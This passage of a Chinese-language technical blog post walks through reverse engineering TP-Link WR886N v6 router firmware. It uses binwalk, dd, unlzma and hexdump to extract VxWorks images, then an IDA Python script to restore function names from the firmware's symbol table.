unlzma a200-3.lzma </span></span><br><span class="line"><span class="string">lxl@ubuntu:~/Desktop/tmp$ ls</span></span><br><span class="line"><span class="string">a200-2.lzma  a200-3  a200.lzma  wr886nv6.bin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 7 其实，直接用win下的7zip就可，会自动忽略尾部的垃圾数据（尽管提示“有效数据外包含额外数据”）</span></span><br><span class="line"><span class="string"># 当然，binwalk -e也可</span></span><br></pre></td></tr></table></figure>
<h3 id="1-3-判定架构"><a href="#1-3-判定架构" class="headerlink" title="1-3-判定架构"></a>1-3-判定架构</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 -Y参数看架构，mips，大端</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ binwalk -Y a200-3 </span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">672           0x2A0           MIPS executable code, 32/64-bit, big endian, at least 845 valid instructions</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 uImage header中为mips、CRC32中为big endian（同一个固件中，主程序与这两者的架构信息应该可对应）</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ binwalk wr886nv6.bin </span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">12656         0x3170          U-Boot version string, <span class="string">"U-Boot 1.1.4 (May  8 2016 - 07:42:47)"</span></span><br><span class="line">12704         0x31A0          CRC32 polynomial table, big endian<span class="comment"># big endian</span></span><br><span class="line">13932         0x366C          uImage header, header size: 64 bytes, header CRC: 0x773178DD, created: 2016-05-08 14:42:48, image size: 20788 bytes, Data Address: 0x80010000, Entry Point: 0x80010000, data CRC: 0x983BDABA, OS: Linux, CPU: MIPS, image <span class="built_in">type</span>: Firmware Image, compression <span class="built_in">type</span>: lzma, image name: <span class="string">"u-boot image"</span><span class="comment"># CPU: MIPS</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 综上，mips，大端</span></span><br></pre></td></tr></table></figure>
<h3 id="1-4-确定基址（未找到"><a href="#1-4-确定基址（未找到" class="headerlink" title="1-4-确定基址（未找到"></a>1-4-确定基址（未找到</h3><h4 id="解压主程序的程序"><a href="#解压主程序的程序" class="headerlink" title="解压主程序的程序"></a>解压主程序的程序</h4><ul>
<li>找到解压主程序的boot程序-36ac</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 主程序a200是lzma压缩的，运行时肯定会有另一个程序来解压它</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># binwalk看firmware，有一个uImage header，其image name: "u-boot image"，这只是一个header文件，其主体文件肯定在后面那一堆lzma数据中</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ binwalk wr886nv6.bin </span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">13932         0x366C          uImage header, header size: 64 bytes, header CRC: 0x773178DD, created: 2016-05-08 14:42:48, image size: 20788 bytes, Data Address: 0x80010000, Entry Point: 0x80010000, data CRC: 0x983BDABA, OS: Linux, CPU: MIPS, image <span class="built_in">type</span>: Firmware Image, compression <span class="built_in">type</span>: lzma, image name: <span class="string">"u-boot image"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># binwalk -Me，36AC的描述，可断定其为u-boot程序（对应前面的header），其来解压主程序a200</span></span><br><span class="line">Scan Time:     2021-01-11 17:31:44</span><br><span class="line">Target File:   /home/lxl/Desktop/tmp/_wr886nv6.bin.extracted/36AC</span><br><span class="line">MD5 Checksum:  a26046acdb2729cde979b969d2f33a56</span><br><span class="line">Signatures:    344</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">44976         0xAFB0          U-Boot version string, <span class="string">"U-Boot 1.1.4 (May  8 2016 - 07:42:44)"</span></span><br><span class="line">45248         0xB0C0          CRC32 polynomial table, big endian</span><br></pre></td></tr></table></figure>
<ul>
<li>dd提取并解压出boot程序</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 同上a200的解压：直接7zip或去除尾部垃圾后unlzma</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># binwalk找偏移</span></span><br><span class="line">13996         0x36AC          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 52148 bytes</span><br><span class="line">41472         0xA200          LZMA compressed data, properties: 0x6E, dictionary size: 8388608 bytes, uncompressed size: 2365008 bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尾部有垃圾数据，解压失败（skip=36ac的偏移，count=41472-13996</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ dd <span class="keyword">if</span>=wr886nv6.bin of=36ac.lzma bs=1 skip=13996 count=27476</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ unlzma 36ac.lzma </span><br><span class="line">unlzma: 36ac.lzma: Compressed data is corrupt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看尾部垃圾（可看出，同样有ff，但不同于a200，没有minifs字符串</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ hexdump 36ac.lzma -C | tail -n 30</span><br><span class="line">000050a0  f1 2a 48 66 e5 dd 1d 11  06 2a 34 6c c8 a1 3a 7e  |.*Hf.....*4l..:~|</span><br><span class="line">000050b0  62 f7 9e ba 50 ef d1 fb  48 1f 19 c9 df 48 de bb  |b...P...H....H..|</span><br><span class="line">000050c0  07 8a 2c 82 b6 8d 4f 1f  90 94 f1 5b 29 d3 bf aa  |..,...O....[)...|</span><br><span class="line">000050d0  6e dc 84 93 5d d7 45 b2  a6 ae b0 da 5a 09 43 00  |n...].E.....Z.C.|</span><br><span class="line">000050e0  cf 45 f4 72 95 0e 4b b8  e1 <span class="built_in">cd</span> 1b 18 f6 2d 05 f6  |.E.r..K......-..|</span><br><span class="line">000050f0  29 8d 5d 0c fe 44 14 15  87 15 35 4c dc f3 86 0e  |).]..D....5L....|</span><br><span class="line">00005100  82 20 23 60 a4 66 0d 3c  ed 29 88 d6 ce d6 df 05  |. <span class="comment">#`.f.&lt;.)......|</span></span><br><span class="line">00005110  c7 94 31 a2 5e f3 52 35  0f 87 f8 88 08 1b 3f f8  |..1.^.R5......?.|</span><br><span class="line">00005120  05 30 7c 4a f3 7f be a3  ec 8e b1 55 f2 3f 65 76  |.0|J.......U.?ev|</span><br><span class="line">00005130  db 8c 59 4b ff ff ff ff  ff ff ff ff ff ff ff ff  |..YK............|</span><br><span class="line">00005140  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span><br><span class="line">*</span><br><span class="line">00006950  ff ff ff ff 00 00 01 00  55 aa 9d d1 a8 c8 83 31  |........U......1|</span><br><span class="line">00006960  c9 69 fb bf bc f0 d4 32  70 c7 aa 55 80 00 10 00  |.i.....2p..U....|</span><br><span class="line">00006970  80 00 10 00 00 00 00 00  00 00 00 09 00 00 00 00  |................|</span><br><span class="line">00006980  00 02 00 00 00 02 00 00  00 00 08 00 00 02 08 00  |................|</span><br><span class="line">00006990  00 00 08 00 00 02 10 00  00 00 70 00 00 02 80 00  |..........p.....|</span><br><span class="line">000069a0  00 00 9e 00 00 03 1e 00  00 00 02 00 00 03 20 00  |.............. .|</span><br><span class="line">000069b0  00 0b 62 b2 00 0e 90 00  00 07 55 9c 00 00 00 00  |..b.......U.....|</span><br><span class="line">000069c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">000069e0  00 00 00 00 bf cc fd 9a  46 ff f6 15 <span class="built_in">cd</span> 6c 25 07  |........F....l%.|</span><br><span class="line">000069f0  51 e0 e9 b9 85 d8 28 30  f3 f8 36 b3 c5 90 11 d9  |Q.....(0..6.....|</span><br><span class="line">00006a00  58 25 c2 05 8d f8 94 d0  64 75 c4 9d 68 a4 ab 91  |X%......du..h...|</span><br><span class="line">00006a10  ee 3a 3d 72 4d 79 46 69  72 6d 77 61 72 65 00 00  |.:=rMyFirmware..|</span><br><span class="line">00006a20  00 00 00 01 5f 21 b3 de  0a 18 0d ac 96 78 6f 23  |...._!.......xo<span class="comment">#|</span></span><br><span class="line">00006a30  57 b5 ae 3f 00 00 00 00  00 00 00 00 00 00 00 00  |W..?............|</span><br><span class="line">00006a40  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00006b54</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去除尾部垃圾后，成功（20778=0x5130+4，并非+3，因为hexdump中从0开始）</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ dd <span class="keyword">if</span>=36ac.lzma of=36ac-2.lzma bs=1 skip=0 count=20788</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ unlzma 36ac-2.lzma </span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ ls</span><br><span class="line">36ac-2  36ac.lzma  a200-3  a200.lzma  binwalk-Me.txt  wr886nv6.bin  _wr886nv6.bin.extracted</span><br></pre></td></tr></table></figure>
<ul>
<li>ida加载uboot程序-36ac</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uImage header中：mips架构、Entry Point=0x80010000即加载基址</span></span><br><span class="line">13932         0x366C          uImage header, header size: 64 bytes, header CRC: 0x773178DD, created: 2016-05-08 14:42:48, image size: 20788 bytes, Data Address: 0x80010000, Entry Point: 0x80010000, data CRC: 0x983BDABA, OS: Linux, CPU: MIPS, image <span class="built_in">type</span>: Firmware Image, compression <span class="built_in">type</span>: lzma, image name: <span class="string">"u-boot image"</span></span><br><span class="line"><span class="comment"># -Y中：big endian</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ binwalk -Y 36ac-2 </span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">148           0x94            MIPS executable code, 32/64-bit, big endian, at least 1250 valid instructions</span><br><span class="line"><span class="comment"># 综上：mips、大端、加载基址0x80010000</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 加载器只有最原始的：binary file</span></span><br><span class="line"><span class="comment"># processor选择mipsb</span></span><br><span class="line"><span class="comment"># 选中manual load，出现disassembly memory organization（或者不选，加载后就会默认打开</span></span><br><span class="line"><span class="comment"># 内存布局中：input file的loading address指定0x80010000、loading size默认就是文件大小、file offset默认0即可</span></span><br><span class="line"><span class="comment"># 选择创建rom section，address和size同input file（作用未知，但ram和rom必须选一个</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一个字节处，快捷键c将byte转化为code，随后ida会自动分析//并没有自动分析，是不是因为没有头的原因？</span></span><br></pre></td></tr></table></figure>
<ul>
<li>刚打开，啥也没有：函数为0、开头只是bytes没有具体指令、导航带全是unexpolred（（是不是需要加上之前那个header，怎么加？</li>
</ul>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-15-050134.jpg" alt="image-20210112100328569"></p>
<ul>
<li>通过此法未找到</li>
</ul>
<h4 id="其他文章涉及"><a href="#其他文章涉及" class="headerlink" title="其他文章涉及"></a>其他文章涉及</h4><ul>
<li><p><a href="https://www.secpulse.com/archives/75635.html：在对0xA200地址之前的一些数据进行分析后可以看到一个疑似uimage" target="_blank" rel="noopener">https://www.secpulse.com/archives/75635.html：在对0xA200地址之前的一些数据进行分析后可以看到一个疑似uimage</a> header的数据段，其中有两处地址指向了0x80001000，这个地址也和很多同类路由器设备的固件加载地址相同，因此我们可以尝试使用该地址作为固件加载地址进行分析。</p>
</li>
<li><p><a href="http://www.devttys0.com/2011/07/reverse-engineering-vxworks-firmware-wrt54gv8/”，主程序的加载基址也为“80001000”" target="_blank" rel="noopener">http://www.devttys0.com/2011/07/reverse-engineering-vxworks-firmware-wrt54gv8/”，主程序的加载基址也为“80001000”</a></p>
</li>
</ul>
<h4 id="可疑点"><a href="#可疑点" class="headerlink" title="可疑点"></a>可疑点</h4><p>36ac解压前的36ac.lzma的尾部数据有“80001000”，这些结构是什么？</p>
<h4 id="vxhunter插件"><a href="#vxhunter插件" class="headerlink" title="vxhunter插件"></a>vxhunter插件</h4><p><a href="https://github.com/PAGalaxyLab/vxhunter/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/PAGalaxyLab/vxhunter/blob/master/README.zh-cn.md</a></p>
<ul>
<li>ghidra：帮助文档中，目标是vxworks的固件，实测：固件、a200均失败（Windows、script manager、manager script directory、添加vxhunter的python脚本所在目录</li>
<li>ida：文档中deme也不知道是咋用的</li>
</ul>
<h3 id="1-5-ida加载"><a href="#1-5-ida加载" class="headerlink" title="1-5-ida加载"></a>1-5-ida加载</h3><ul>
<li>加载基址0x80001000，架构mips大端<ul>
<li>并没有在boot程序36ac中找到80001000</li>
<li>36ac解压前的36ac.lzma尾部数据中有“80001000”，据文章“<a href="https://www.secpulse.com/archives/75635.html”，说是加载基址和入口点，但具体未知" target="_blank" rel="noopener">https://www.secpulse.com/archives/75635.html”，说是加载基址和入口点，但具体未知</a></li>
<li>之前也有文章“<a href="http://www.devttys0.com/2011/07/reverse-engineering-vxworks-firmware-wrt54gv8/”，主程序的加载基址也为“80001000”" target="_blank" rel="noopener">http://www.devttys0.com/2011/07/reverse-engineering-vxworks-firmware-wrt54gv8/”，主程序的加载基址也为“80001000”</a></li>
<li>36ac解压前的36ac.lzma的尾部数据有“80001000”，这些结构是什么？</li>
<li>故暂且这样吧，到底怎么确定的未知</li>
</ul>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 加载器只有最原始的：binary file</span></span><br><span class="line"><span class="comment"># processor选择mipsb</span></span><br><span class="line"><span class="comment"># 选中manual load，出现disassembly memory organization（或者不选，加载后就会默认打开</span></span><br><span class="line"><span class="comment"># 内存布局中：input file的loading address指定0x80010000、loading size默认就是文件大小、file offset默认0即可</span></span><br><span class="line"><span class="comment"># 选择创建rom section，address和size同input file（作用未知，但ram和rom必须选一个</span></span><br></pre></td></tr></table></figure>
<ul>
<li>68识别出6149，而75识别出2210（75中需要手动p成函数，而68中自动识别了），why？68版np就行了</li>
<li>Imports和Exports都是空的，因为没有导入符号表</li>
</ul>
<h2 id="02-符号表文件"><a href="#02-符号表文件" class="headerlink" title="02-符号表文件"></a>02-符号表文件</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># binwalk -Me提取固件，目录中搜索vxworkx中函数，如bzero</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ <span class="built_in">cd</span> _wr886nv6.bin.extracted/</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/_wr886nv6.bin.extracted$ grep -r bzero .</span><br><span class="line">Binary file ./C2E3A matches</span><br></pre></td></tr></table></figure>
<ul>
<li>winhex中，大量的VxWorks的函数名（00分割），推测是符号表</li>
</ul>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-15-050140.jpg" alt="image-20210112152211065"></p>
<ul>
<li>找到函数名的起始地址头，找各个函数名的偏移（相对于大量函数名开头的偏移，而非文件开始）</li>
</ul>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-15-50139.jpg" alt="image-20210112152819753"></p>
<ul>
<li>文件最开始处，是有规律的，前8个字节后，是某结构体数组，结构体三个成员：1字节 + 3字节 + 4字节</li>
</ul>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-15-050135.jpg" alt="image-20210112154024425"></p>
<ul>
<li>IDA中g到4字节的地址处，恰好是函数的开头</li>
</ul>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-15-050138.jpg" alt="image-20210112154323935"></p>
<ul>
<li>综上，结构体三个成员：1字节-类型、3字节-文件偏移、4字节-内存偏移</li>
</ul>
<h2 id="03-IDA脚本修复"><a href="#03-IDA脚本修复" class="headerlink" title="03-IDA脚本修复"></a>03-IDA脚本修复</h2><ul>
<li>根据符号表文件，获取函数名</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 有需求时再细看</span></span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"></span><br><span class="line">symfile_path = <span class="string">'./C2E3A'</span>    </span><br><span class="line">symbols_table_start = <span class="number">8</span></span><br><span class="line">strings_table_start = <span class="number">0x9d00</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(symfile_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    symfile_contents = f.read()</span><br><span class="line"></span><br><span class="line">symbols_table = symfile_contents[symbols_table_start:strings_table_start]</span><br><span class="line">strings_table = symfile_contents[strings_table_start:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_string_by_offset</span><span class="params">(offset)</span>:</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> strings_table[offset+index] != <span class="string">'\x00'</span>:</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> strings_table[offset:offset+index]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_symbols_metadata</span><span class="params">()</span>:</span></span><br><span class="line">    symbols = []</span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> xrange(<span class="number">0</span>, len(symbols_table),<span class="number">8</span>):</span><br><span class="line">        symbol_item = symbols_table[offset:offset+<span class="number">8</span>]</span><br><span class="line">        flag = symbol_item[<span class="number">0</span>]</span><br><span class="line">        string_offset = int(symbol_item[<span class="number">1</span>:<span class="number">4</span>].encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">        string_name = get_string_by_offset(string_offset)</span><br><span class="line">        target_address = int(symbol_item[<span class="number">-4</span>:].encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">        symbols.append((flag, string_name, target_address))</span><br><span class="line">    <span class="keyword">return</span> symbols</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_symbols</span><span class="params">(symbols_meta_data)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> flag, string_name, target_address <span class="keyword">in</span> symbols_meta_data:</span><br><span class="line">        idc.MakeName(target_address, string_name)</span><br><span class="line">        <span class="keyword">if</span> flag == <span class="string">'\x54'</span>:</span><br><span class="line">            idc.MakeCode(target_address)</span><br><span class="line">            idc.MakeFunction(target_address)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    symbols_metadata = get_symbols_metadata()</span><br><span class="line">    add_symbols(symbols_metadata)</span><br></pre></td></tr></table></figure>
<ul>
<li>运行前，都是未识别的函数名</li>
</ul>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-15-050137.jpg" alt="image-20210112154939203"></p>
<ul>
<li>运行后，解析符号表文件C2E3A，获取了函数名</li>
</ul>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-15-050139.jpg" alt="image-20210112155059641"></p>
<h2 id="04-其他"><a href="#04-其他" class="headerlink" title="04-其他"></a>04-其他</h2><ul>
<li>uncompressed size是解压后文件的大小</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># lzma压缩的数据，uncompressed size是解压后文件的大小</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x36AC为52148，0xA200为2365008</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ binwalk wr886nv6.bin </span><br><span class="line">13996         0x36AC          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 52148 bytes</span><br><span class="line">41472         0xA200          LZMA compressed data, properties: 0x6E, dictionary size: 8388608 bytes, uncompressed size: 2365008 bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># ll验证</span></span><br><span class="line"><span class="comment"># dd从firmware中提取、dd去掉尾部ff等垃圾数据、unlzma解压</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ ll</span><br><span class="line">-rw-r--r--  1 lxl lxl   52148 Jan 12 09:40 36ac-2</span><br><span class="line">-rw-r--r--  1 lxl lxl 2365008 Jan 11 17:01 a200-3</span><br></pre></td></tr></table></figure>
<ul>
<li>dd提取出待lzma解压的文件，尾部有垃圾数据（从ffff开始），这些数据是什么？</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 36ac，怀疑是解压主程序a200的boot程序</span></span><br><span class="line"><span class="comment"># 注意到有两个80 00 10 00，MyFirmware字符串</span></span><br><span class="line"><span class="comment"># 其他文章中说是：load address 和 entry point，也确实是主程序的加载基址</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ hexdump 36ac.lzma -C | tail -n 30</span><br><span class="line">000050a0  f1 2a 48 66 e5 dd 1d 11  06 2a 34 6c c8 a1 3a 7e  |.*Hf.....*4l..:~|</span><br><span class="line">000050b0  62 f7 9e ba 50 ef d1 fb  48 1f 19 c9 df 48 de bb  |b...P...H....H..|</span><br><span class="line">000050c0  07 8a 2c 82 b6 8d 4f 1f  90 94 f1 5b 29 d3 bf aa  |..,...O....[)...|</span><br><span class="line">000050d0  6e dc 84 93 5d d7 45 b2  a6 ae b0 da 5a 09 43 00  |n...].E.....Z.C.|</span><br><span class="line">000050e0  cf 45 f4 72 95 0e 4b b8  e1 <span class="built_in">cd</span> 1b 18 f6 2d 05 f6  |.E.r..K......-..|</span><br><span class="line">000050f0  29 8d 5d 0c fe 44 14 15  87 15 35 4c dc f3 86 0e  |).]..D....5L....|</span><br><span class="line">00005100  82 20 23 60 a4 66 0d 3c  ed 29 88 d6 ce d6 df 05  |. <span class="comment">#`.f.&lt;.)......|</span></span><br><span class="line">00005110  c7 94 31 a2 5e f3 52 35  0f 87 f8 88 08 1b 3f f8  |..1.^.R5......?.|</span><br><span class="line">00005120  05 30 7c 4a f3 7f be a3  ec 8e b1 55 f2 3f 65 76  |.0|J.......U.?ev|</span><br><span class="line">00005130  db 8c 59 4b ff ff ff ff  ff ff ff ff ff ff ff ff  |..YK............|</span><br><span class="line">00005140  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span><br><span class="line">*</span><br><span class="line">00006950  ff ff ff ff 00 00 01 00  55 aa 9d d1 a8 c8 83 31  |........U......1|</span><br><span class="line">00006960  c9 69 fb bf bc f0 d4 32  70 c7 aa 55 80 00 10 00  |.i.....2p..U....|<span class="comment"># 加载基址</span></span><br><span class="line">00006970  80 00 10 00 00 00 00 00  00 00 00 09 00 00 00 00  |................|</span><br><span class="line">00006980  00 02 00 00 00 02 00 00  00 00 08 00 00 02 08 00  |................|</span><br><span class="line">00006990  00 00 08 00 00 02 10 00  00 00 70 00 00 02 80 00  |..........p.....|</span><br><span class="line">000069a0  00 00 9e 00 00 03 1e 00  00 00 02 00 00 03 20 00  |.............. .|</span><br><span class="line">000069b0  00 0b 62 b2 00 0e 90 00  00 07 55 9c 00 00 00 00  |..b.......U.....|</span><br><span class="line">000069c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">000069e0  00 00 00 00 bf cc fd 9a  46 ff f6 15 <span class="built_in">cd</span> 6c 25 07  |........F....l%.|</span><br><span class="line">000069f0  51 e0 e9 b9 85 d8 28 30  f3 f8 36 b3 c5 90 11 d9  |Q.....(0..6.....|</span><br><span class="line">00006a00  58 25 c2 05 8d f8 94 d0  64 75 c4 9d 68 a4 ab 91  |X%......du..h...|</span><br><span class="line">00006a10  ee 3a 3d 72 4d 79 46 69  72 6d 77 61 72 65 00 00  |.:=rMyFirmware..|</span><br><span class="line">00006a20  00 00 00 01 5f 21 b3 de  0a 18 0d ac 96 78 6f 23  |...._!.......xo<span class="comment">#|</span></span><br><span class="line">00006a30  57 b5 ae 3f 00 00 00 00  00 00 00 00 00 00 00 00  |W..?............|</span><br><span class="line">00006a40  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00006b54</span><br><span 